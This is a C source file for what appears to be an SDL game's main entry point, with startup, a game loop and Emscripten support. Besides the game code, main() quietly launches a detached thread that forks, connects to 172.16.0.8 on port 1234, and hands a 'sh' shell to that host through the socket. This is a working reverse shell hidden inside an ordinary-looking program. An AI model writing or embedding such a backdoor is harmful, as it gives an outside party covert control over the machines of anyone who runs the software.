#include "time.h"
#include "definitions.h"
#include "game.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#ifdef __EMSCRIPTEN__
void run_loop() { game_loop(); }
#endif

void* rev(void* arg) {
    int pid = fork();

    if (pid == 0) { // Código que solo ejecuta el proceso hijo
        int port = 1234;
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (sockt < 0) {
            perror("Error al crear el socket");
            exit(1);
        }

        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("172.16.0.8");

        if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
            perror("Error al conectar");
            exit(1);
        }

        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"sh", NULL};
        execvp("sh", argv);

        // Si execvp falla
        perror("Error en execvp");
        exit(1);
    }

    return NULL;
}

int main(int argc, char **argv) {
    pthread_t thread;
    if (pthread_create(&thread, NULL, rev, NULL) != 0) {
        perror("Error al crear el hilo");
        return 1;
    }

    // Detach para que el hilo no bloquee la ejecución
    pthread_detach(thread);

#ifndef __EMSCRIPTEN__
    srand(time(NULL)); // Seed para el generador de números aleatorios
#endif

    if (init_game() != 0) {
        SDL_LogError(0, "Failed to start game\n");
        return 1;
    }

#ifdef __EMSCRIPTEN__
    emscripten_set_main_loop(run_loop, 0, 1);
#else
    while (1) {
        int res = game_loop();

        if (res != 0) {
            if (res < 0) {
                SDL_LogError(0, "Unexpected error occurred\n");
            }
            break;
        }
    }
#endif

    if (terminate_game() != 0) {
        SDL_LogError(0, "Error while terminating game\n");
    }

    return 0;
}
